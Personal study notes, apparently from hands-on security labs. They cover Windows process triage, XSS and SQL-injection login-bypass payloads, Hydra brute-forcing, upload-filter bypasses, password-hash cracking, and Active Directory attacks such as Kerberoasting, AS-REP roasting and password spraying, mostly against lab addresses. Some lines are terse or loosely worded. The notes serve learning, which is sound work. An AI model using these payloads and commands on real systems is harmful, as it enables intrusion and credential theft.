        The first Windows process on the list is System. It was mentioned in a previous section that a PID for any given process is assigned at random, but that is not the case for the System process. The PID for System is always 4.
            What is unusual behavior for this process?
                A parent process (aside from System Idle Process (0))
                Multiple instances of System. (Should only be 1 instance)
                A different PID. (Remember that the PID will always be PID 4)
                Not running in Session 0
            The next process is smss.exe (Session Manager Subsystem). This process, also known as the Windows Session Manager, is responsible for creating new sessions. This is the first user-mode process started by the kernel.

            This process starts the kernel mode and user mode of the Windows subsystem (you can read more about the NT Architecture here). This subsystem includes win32k.sys (kernel mode), winsrv.dll (user mode), and csrss.exe (user mode).

            Smss.exe starts csrss.exe (Windows subsystem) and wininit.exe in Session 0, an isolated Windows session for the operating system, and csrss.exe and winlogon.exe for Session 1, which is the user session. The first child instance creates child instances in new sessions. This is done by smss.exe copying itself into the new session and self-terminating.
            What is unusual?

                A different parent process other than System(4)
                Image path is different from C:\Windows\System32
                More than 1 running process. (children self-terminate and exit after each new session)
                User is not SYSTEM
                Unexpected registry entries for Subsystem

            As mentioned in the previous section, csrss.exe (Client Server Runtime Process) is the user-mode side of the Windows subsystem. This process is always running and is critical to system operation. If by chance this process is terminated it will result in system failure. This process is responsible for the Win32 console window and process thread creation and deletion. For each instance csrsrv.dll, basesrv.dll, and winsrv.dll are loaded (along with others).

            This process is also responsible for making the Windows API available to other processes, mapping drive letters, and handling the Windows shutdown process.

            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process masquerading as csrss.exe in plain sight
                User is not SYSTEM

            The Windows Initialization Process, wininit.exe, is responsible for launching services.exe (Service Control Manager), lsass.exe (Local Security Authority), and lsaiso.exe within Session 0. This is another critical Windows process that runs in the background, along with its child processes.


            Note: lsaiso.exe is a process associated with Credential Guard and Key Guard. You will only see this process if Credential Guard is enabled.
            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Multiple running instances
                Not running as SYSTEM

            The next process is the Service Control Manager (SCM), which is services.exe. Its primary responsibility is to handle system services: loading services, interacting with services, starting/ending services, etc. It maintains a database that can be queried using a Windows built-in utility, 'sc.exe.'


            Information regarding services is stored in the registry, HKLM\System\CurrentControlSet\Services.

            What is unusual?

                A parent process other than wininit.exe
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Multiple running instances
                Not running as SYSTEM

            The Service Host (Host Process for Windows Services), or svchost.exe, is responsible for hosting and managing Windows services

            What is unusual?

                A parent process other than services.exe
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                The absence of the -k parameter


            "Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. It also writes to the Windows Security Log."
            There are two types of access tokens:

              primary access tokens: those associated with a user account that are generated on log on
              impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

          For an impersonation token, there are different levels:

              SecurityAnonymous: current user/client cannot impersonate another user/client
              SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
              SecurityImpersonation: current user/client can impersonate the client's security context on the local system
              SecurityDelegation: current user/client can impersonate the client's security context on a remote system

          where the security context is a data structure that contains users' relevant security information.

          The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

              SeImpersonatePrivilege
              SeAssignPrimaryPrivilege
              SeTcbPrivilege
              SeBackupPrivilege
              SeRestorePrivilege
              SeCreateTokenPrivilege
              SeLoadDriverPrivilege
              SeTakeOwnershipPrivilege
              SeDebugPrivilege

            It creates security tokens for SAM (Security Account Manager), AD (Active Directory), and NETLOGON. It uses authentication packages specified in HKLM\System\CurrentControlSet\Control\Lsa.

            The Windows Logon, winlogon.exe, is responsible for handling the Secure Attention Sequence (SAS). This is the ALT+CTRL+DELETE key combination users press to enter their username & password.

            It is also responsible for locking the screen and running the user's screensaver, among other functions.

            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32

                Not running as SYSTEM
                Shell value in the registry other than explorer.exe

            The last process we'll look at is the Windows Explorer, explorer.exe. This is the process that gives the user access to their folders and files. It also provides functionality to other features such as the Start Menu, Taskbar, etc.

            As mentioned previously, the Winlogon process runs userinit.exe, which launches the value in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell. Userinit.exe exits after spawning explorer.exe. Because of this, the parent process is non-existent.

            What is unusual?

                An actual parent process. (userinit.exe calls this process and exits)
                Image file path other than C:\Windows
                Running as an unknown user

    There are three major types of XSS attacks:
      DOM (Special)
              DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the <script></script> HTML tag.
                <iframe src="javascript:alert(`xss`)">
      Persistent (Server-side)
              Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts. 
              Once request captured, add a new header like this. True-Client-IP: <iframe src="javascript:alert(`xss`)">
      Reflected (Client-side)
              Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise search data.



    To disable the browser built-in XSS protection

1. SQLi
  {"email":"' or 1=1--","password":"no"}
  Why does this work?

      1.The character ' will close the brackets in the SQL query
      2.'OR' in a SQL statement will return true if either side of it is true. As 1=1 is always true, the whole statement is true. Thus it will tell the server that the email is valid, and log us into user id 0, which happens to be the administrator account. The 1=1 can be used when the email or username is not known or invalid
      3.The -- character is used in SQL to comment out data, any restrictions on the login will no longer work as they are interpreted as a comment. This is like the # and // comment in python and javascript respectively

  {"email":"bender@juice-sh.op'--","password":"a"}

The § § is not two sperate inputs but rather Burp's implementation of quotations e.g. ""

  hydra -t 4 -l admin@juice-sh.op -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt 10.10.223.38 http-post-form "/#/login:password=^PASS^=yes&login=Log+In&proc_login=true:Invalid email or password."

#Another use of hydra
hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -f 10.10.82.175 -s 8080 http-get /manager/html #Not worked
hydra -l jan -t 4 -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.55.243

Consider the following concrete examples:

    hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ftp will use mark as the username as it iterates over the provided passwords against the FTP server.
    hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.186.248 is identical to the previous example. 10.10.186.248 ftp is the same as ftp://10.10.186.248.
    hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ssh will use frank as the user name as it tries to login via SSH using the different passwords.
    hydra -l <username> -P <wordlist> 10.10.22.33 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
    hydra -t 4 -I -l molly -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.22.33 http-post-form "/login/:username=molly&password=^PASS^:Your username or password is incorrect."
    hydra -L usernames -P passwords 192.208.137.3 http-post-form
"/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid
credentials or user not activated!"

There are some extra optional arguments that you can add:

    -s PORT to specify a non-default port for the service in question.
    -V or -vV, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
    -t n where n is the number of parallel connections to the target. -t 16 will create 16 threads used to connect to the target.
    -d, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this right away.

Filtering
  Extension validation
    MS Windows still uses them to identify file types
    Unix use magic numbers
  File type filtering
    MIME validation
      (Multipurpose Internet Mail Extension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request with the format <type>/<subtype>
        Content-Type: image/jpeg
    Magic number validation
  FIle length
  file name     
    "bad characters"
  file content

  Bypassing client-side filtering
    Turn off Javascript in your browser -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
    
    Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below. It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove ^js$|:
      Example: Refresh page and do intercept > response to this request with burp. Eliminate or comment unwanted function. Forward.

    Intercept and modify the file upload. Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.
        Example with a legitimate extension: Intercept when uploading the message and changing extension and MIME

    Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command

  BYpassing server-side filtering: 
    File extensions
      Another example would be testing which is a valid extension and upload other file with 2 extensions. Valid: dog.jpg | Not valid malicious.php | Valid to access: malicious.jpg.php or malicious.jpg.php5

    Magic numbers
      Using hexeditor to check first 8 hex characters and file 
      We could use vim with :%!xxd. To save changes :%!xxd -r
====================
Hashing 

    You can't encrypt the passwords, as the key has to be stored somewhere. If someone gets the key, they can just decrypt the passwords.

    This is where hashing comes in. What if, instead of storing the password, you just stored the hash of the password? This means you never have to store the user's password, and if your database was leaked then an attacker would have to crack each password to find out what the password was. That sounds fairly useful.

    There's just one problem with this. What if two users have the same password? As a hash function will always turn the same input into the same output, you will store the same password hash for each user. That means if someone cracks that hash, they get into more than one account. It also means that someone can create a "Rainbow table" to break the hashes.

    A rainbow table is a lookup table of hashes to plaintexts, so you can quickly find out what password a user had just from the hash. A rainbow table trades time taken to crack a hash for hard disk space, but they do take time to create.


    To protect against rainbow tables, we add a salt to the passwords. The salt is randomly generated and stored in the database, unique to each user. In theory, you could use the same salt for all users but that means that duplicate passwords would still have the same hash, and a rainbow table could still be created specific passwords with that salt.

    The salt is added to either the start or the end of the password before it’s hashed, and this means that every user will have a different password hash even if they have the same password. Hash functions like bcrypt and sha512crypt handle this automatically. Salts don’t need to be kept private.



    Unix style password hashes are very easy to recognise, as they have a prefix. The prefix tells you the hashing algorithm used to generate the hash. The standard format is$format$rounds$salt$hash.

    Windows passwords are hashed using NTLM, which is a variant of md4. They're visually identical to md4 and md5 hashes, so it's very important to use context to work out the hash type.

    On Linux, password hashes are stored in /etc/shadow. This file is normally only readable by root. They used to be stored in /etc/passwd, and were readable by everyone.

    On Windows, password hashes are stored in the SAM. Windows tries to prevent normal users from dumping them, but tools like mimikatz exist for this. Importantly, the hashes found there are split into NT hashes and LM hashes.


============================
John the ripper

john --format=[format] --wordlist=[path]

  A Note on Formats:
    When you are telling john to use formats, if you're dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with raw- to tell john you're just dealing with a standard hash type, though this doesn't always apply. To check if you need to add the prefix or not, you can list all of John's formats using john --list=formats and either check manually, or grep for your hash type using something like john --list=formats | grep -iF "md5".

NTHash / NTLM

  NThash is the hash format that modern Windows Operating System machines will store user and service passwords in. It's also commonly referred to as "NTLM" which references the previous version of Windows format for hashing passwords known as "LM", thus "NT/LM".

  A little bit of history, the NT designation for Windows products originally meant "New Technology", and was used- starting with Windows NT, to denote products that were not built up from the MS-DOS Operating System. Eventually, the "NT" line became the standard Operating System type to be released by Microsoft and the name was dropped, but it still lives on in the names of some Microsoft technologies. 

  You can acquire NTHash/NTLM hashes by dumping the SAM database on a Windows machine, by using a tool like Mimikatz or from the Active Directory database: NTDS.dit. You may not have to crack the hash to continue privilege escalation- as you can often conduct a "pass the hash" attack instead, but sometimes hash cracking is a viable option if there is a weak password policy

Unshadowing
  unshadow [path to passwd] [path to shadow]
  unshadow - Invokes the unshadow tool
  [path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine
  [path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine 

Using single crack mode
  john --single --format=[format] [path to file]

  A Note on File Formats in Single Crack Mode:
    If you're cracking hashes in single crack mode, you need to change the file format that you're feeding john for it to understand what data to create a wordlist from. You do this by prepending the hash with the username that the hash belongs to, so according to the above example- we would change the file hashes.txt
    From:
    1efee03cdcb96d90ad48ccc7b8666033
    To
    mike:1efee03cdcb96d90ad48ccc7b8666033


How to create Custom Rules

  Custom rules are defined in the john.conf file, usually located in /etc/john/john.conf if you have installed John using a package manager or built from source with make and in /opt/john/john.conf on the TryHackMe Attackbox.

  Let's go over the syntax of these custom rules, using the example above as our target pattern. Note that there is a massive level of granular control that you can define in these rules, I would suggest taking a look at the wiki here in order to get a full view of the types of modifier you can use, as well as more examples of rule implementation.

  The first line:
  [List.Rules:THMRules] - Is used to define the name of your rule, this is what you will use to call your custom rule as a John argument.
  We then use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:
  Az - Takes the word and appends it with the characters you define
  A0 - Takes the word and prepends it with the characters you define
  c - Capitalises the character positionally

  These can be used in combination to define where and what in the word you want to modify.

  Lastly, we then need to define what characters should be appended, prepended or otherwise included, we do this by adding character sets in square brackets [ ] in the order they should be used. These directly follow the modifier patterns inside of double quotes " ". Here are some common examples:

  https://campus.barracuda.com/product/campus/doc/5472273/regular-expressions
  [0-9] - Will include numbers 0-9
  [0] - Will include only the number 0
  [A-z] - Will include both upper and lowercase
  [A-Z] - Will include only uppercase letters
  [a-z] - Will include only lowercase letters
  [a] - Will include only a
  [!£$%@] - Will include the symbols !£$%@


  Putting this all together, in order to generate a wordlist from the rules that would match the example password "Polopassword1!" (assuming the word polopassword was in our wordlist) we would create a rule entry that looks like this:
  [List.Rules:PoloPassword]
  cAz"[0-9] [!£$%@]"

  In order to:
    Capitalise the first  letter - c
    Append to the end of the word - Az
    A number in the range 0-9 - [0-9]
    Followed by a symbol that is one of [!£$%@]
  
  Using Custom Rules
  We could then call this custom rule as a John argument using the  --rule=PoloPassword flag.
  As a full command: john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]
  As a note I find it helpful to talk out the patterns if you're writing a rule- as shown above, the same applies to writing RegEx patterns too.

  Jumbo John already comes with a large list of custom rules, which contain modifiers for use almost all cases. If you get stuck, try looking at those rules [around line 678] if your syntax isn't working properly.

Cracking password protected zip file
Zip2John

  Similarly to the unshadow tool that we used previously, we're going to be using the zip2john tool to convert the zip file into a hash format that John is able to understand, and hopefully crack. The basic usage is like this:
  zip2john [options] [zip file] > [output file]
  [options] - Allows you to pass specific checksum options to zip2john, this shouldn't often be necessary
  [zip file] - The path to the zip file you wish to get the hash of
  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from

  Example Usage
    zip2john zipfile.zip > zip_hash.txt

Cracking a password protected RAR archive
Rar2John

  Almost identical to the zip2john tool that we just used, we're going to use the rar2john tool to convert the rar file into a hash format that John is able to understand. The basic syntax is as follows:
  rar2john [rar file] > [output file]
  rar2john - Invokes the rar2john tool
  [rar file] - The path to the rar file you wish to get the hash of
  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from

  Example Usage
    rar2john rarfile.rar > rar_hash.txt

Cracking SSH key passwords

  Note that if you don't have ssh2john installed, you can use ssh2john.py, which is located in the /opt/john/ssh2john.py. If you're doing this, replace the ssh2john command with python3 /opt/ssh2john.py or on Kali, python /usr/share/john/ssh2john.py.

  ssh2john [id_rsa private key file] > [output file]

  ssh2john - Invokes the ssh2john tool

  [id_rsa private key file] - The path to the id_rsa file you wish to get the hash of

  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from 

=====================================================
Encryption - Crypto 101

  Passphrase - Separate to the key, a passphrase is similar to a password and used to protect a key.

DO NOT encrypt passwords unless you’re doing something like a password manager. Passwords should not be stored in plaintext, and you should use hashing to manage them safely.
An important thing to remember about modulo is that it’s not reversible. If I gave you an equation: x % 5 = 4, there are infinite values of x that will be valid.

The two main categories of Encryption are symmetric and asymmetric.

  Symmetric encryption uses the same key to encrypt and decrypt the data. Examples of Symmetric encryption are DES (Broken) and AES. These algorithms tend to be faster than asymmetric cryptography, and use smaller keys (128 or 256 bit keys are common for AES, DES keys are 56 bits long).

  Asymmetric encryption uses a pair of keys, one to encrypt and the other in the pair to decrypt. Examples are RSA and Elliptic Curve Cryptography. Normally these keys are referred to as a public key and a private key. Data encrypted with the private key can be decrypted with the public key, and vice versa. Your private key needs to be kept private, hence the name. Asymmetric encryption tends to be slower and uses larger keys, for example RSA typically uses 2048 to 4096 bit keys.

=-=-=-=-=
The math(s) side

  RSA is based on the mathematically difficult problem of working out the factors of a large number. It’s very quick to multiply two prime numbers together, say 17*23 = 391, but it’s quite difficult to work out what two prime numbers multiply together to make 14351 (113x127 for reference).
  The attacking side

  The maths behind RSA seems to come up relatively often in CTFs, normally requiring you to calculate variables or break some encryption based on them. The wikipedia page for RSA seems complicated at first, but will give you almost all of the information you need in order to complete challenges.

  There are some excellent tools for defeating RSA challenges in CTFs, and my personal favorite is https://github.com/Ganapati/RsaCtfTool which has worked very well for me. I’ve also had some success with https://github.com/ius/rsatool.

  The key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.

  “p” and “q” are large prime numbers, “n” is the product of p and q.

  The public key is n and e, the private key is n and d.

  “m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).

SSH authentication
ssh-keygen
  It’s very important to mention that the passphrase to decrypt the key isn’t used to identify you to the server at all, all it does is decrypt the SSH key. The passphrase is never transmitted, and never leaves your system.

Basics of AD 

The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:

    Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
    Stored by default in %SystemRoot%\NTDS
    accessible only by the domain controller

A forest consists of these parts:
  Trees - A hierarchy of domains in Active Directory Domain Services
  Domains - Used to group and manage objects 
  Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
  Trusts - Allows users to access resources in other domains
  Objects - users, groups, printers, computers, shares
  Domain Services - DNS Server, LLMNR, IPv6
  Domain Schema - Rules for object creation

The four types of users are: 
  Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
  Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
  Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
  Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization

Active Directory groups: 

    Security Groups - These groups are used to specify permissions for a large number of users
    Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration

Default Security Groups - 

  There are a lot of default security groups so I won't be going into too much detail of each past a brief description of the permissions that they offer to the assigned group. Here is a brief outline of the security groups:

    Domain Controllers - All domain controllers in the domain
    Domain Guests - All domain guests
    Domain Users - All domain users
    Domain Computers - All workstations and servers joined to the domain
    Domain Admins - Designated administrators of the domain
    Enterprise Admins - Designated administrators of the enterprise

Trusts & policies
In some environments trusts can be extended out to external domains and even forests in some cases.

The two types of trusts below: 

    Directional - The direction of the trust flows from a trusting domain to a trusted domain
    Transitive - The trust relationship expands beyond just two domains to include other trusted domains

Domain Policies Overview - 

  Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender

Outlined below are the default domain services: 

    LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
    Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
    DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames

Domain authentication overview
    Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.
    NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol

AD attacks
Tools needed

  bloodhound

With Kerberos we can use Kerbrute
kerbrute userenum -d spookysec.local --dc 10.10.246.78 userlist.txt

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

GetNPUsers.py spookysec.local/ -usersfile after_kerbrute.txt -format john -output results.txt

smbclient -U "svc-admin" \\\\10.10.134.44\\backup

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes. Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

What is Kerberos?
Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.


Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.

Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.

Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

AS-REQ w/ Pre-Authentication In Detail - 
The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

Ticket Granting Ticket Contents -
In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Service Ticket Contents - 
To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

    Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
    User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

Kerberos Authentication Overview -

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access 

Kerberos Tickets Overview - 

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements -

    Kerbrute Enumeration - No domain access required 
    Pass the Ticket - Access as a user to the domain required
    Kerberoasting - Access as any user required
    AS-REP Roasting - Access as any user required
    Golden Ticket - Full domain compromise (domain admin) required 
    Silver Ticket - Service hash required 
    Skeleton Key - Full domain compromise (domain admin) required

Enumeration w/Kerbrute
You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - 10.10.55.165  CONTROLLER.local    

Abusing Pre-Authentication Overview -

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.
1. kerbrute userenum -d spookysec.local --dc 10.10.246.78 userlist.txt

Harvesting & Brute-Forcing tickets w/Rubeus

Rubeus.exe harvest /interval:30 This command tells Rubeus to harvest for TGTs every 30 seconds

Brute-Forcing / Password-Spraying w/ Rubeus -

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

echo 10.10.55.165 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
Rubeus.exe brute /password:Password1 /noticket - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

-=-=-=-=
Kerberoasting w/Rubeus & Impacket
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain

Method 1 - Rubeus
Rubeus.exe kerberoast This will dump the Kerberos hash of any kerberoastable users
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Method 2 - Impacket
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.55.165 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Kerberoasting Mitigation
Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

-=-=-=-==
AS-REP Roasting w/Rubeus 
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.

There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.


AS-REP Roasting Overview - 

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

Dumping KRBASREP5 Hashes w/ Rubeus -
  Rubeus.exe asreproast - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
Crack those Hashes w/ hashcat - 
  Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....

AS-REP Roasting Mitigations - 

    Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective

    Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

Pass the ticket w/ mimikatz 
Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

Pass the Ticket Overview - 
